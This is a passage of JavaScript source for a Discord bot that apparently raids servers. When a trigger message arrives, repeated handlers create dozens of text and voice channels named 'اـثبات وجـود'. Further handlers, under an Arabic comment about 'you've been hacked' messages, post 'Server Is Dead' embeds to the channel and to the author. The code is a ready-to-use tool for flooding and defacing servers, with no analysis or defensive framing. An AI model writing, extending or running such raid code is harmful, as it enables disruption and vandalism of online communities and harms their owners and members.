  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});

//هنا الرسايل تم تهكيرك وكذا

client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
